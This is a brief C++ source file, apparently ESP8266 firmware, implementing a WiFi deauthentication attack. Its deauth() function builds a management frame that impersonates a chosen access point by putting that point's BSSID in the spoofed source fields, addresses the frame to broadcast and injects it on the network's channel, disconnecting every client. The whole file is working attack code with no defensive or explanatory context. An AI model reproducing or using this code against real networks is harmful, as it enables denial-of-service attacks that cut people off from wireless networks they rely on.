#include "Attack.h"

Attack::Attack() {}

void Attack::deauth(int apNum) {
    // build deauth packet
    int packetSize = sizeof(deauthPacket);
    uint8_t deauthpkt[packetSize];
    memcpy(deauthpkt, deauthPacket, packetSize);
    memcpy(&deauthpkt[4], this->broadcast, 6);
    memcpy(&deauthpkt[10], WiFi.BSSID(apNum), 6);
    memcpy(&deauthpkt[16], WiFi.BSSID(apNum), 6);
    deauthpkt[24] = 1;

    // send deauth frame
    deauthpkt[0] = 0xc0;
    wifi_set_channel(WiFi.channel(apNum));
    wifi_send_pkt_freedom(deauthpkt, packetSize, 0) == 0;
}
